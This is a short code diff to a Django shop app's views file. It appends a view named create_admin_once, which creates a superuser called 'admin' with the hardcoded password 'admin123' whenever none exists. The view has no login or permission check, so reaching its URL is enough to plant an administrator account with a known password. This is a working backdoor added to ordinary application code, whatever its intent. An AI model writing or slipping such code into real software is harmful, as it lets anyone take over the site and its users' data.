@@ -71,3 +71,16 @@ def wishlist(request):
     return render(request, 'core/wishlist.html', {
         'items': items
     })
+
+
+from django.http import HttpResponse
+from django.contrib.auth.models import User
+
+def create_admin_once(request):
+    if not User.objects.filter(username="admin").exists():
+        User.objects.create_superuser(
+            "admin",
+            "admin@example.com",
+            "admin123"
+        )
+    return HttpResponse("Admin created")
